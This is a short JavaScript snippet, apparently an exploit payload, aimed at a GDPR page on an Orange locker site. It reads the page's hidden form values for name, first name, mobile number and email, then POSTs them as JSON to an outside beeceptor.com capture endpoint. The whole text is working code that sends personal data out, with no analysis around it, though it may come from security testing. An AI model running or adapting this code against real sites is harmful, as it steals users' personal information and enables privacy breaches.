fetch('https://lockernow.orange.com/rgpd.php')
  .then(r => r.text())
  .then(html => {
    const doc = new DOMParser().parseFromString(html, 'text/html');
    const data = {};
    ['nom', 'prenom', 'mobile', 'emailRappel'].forEach(name => {
      data[name] = doc.querySelector(`input[name="${name}"]`)?.value;
    });
    console.log('Datos obtenidos:', data);
    return fetch('https://sdsdf.free.beeceptor.com', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(data)
    });
  })
  .then(r => r.text())
  .then(res => console.log('Respuesta beeceptor:', res));
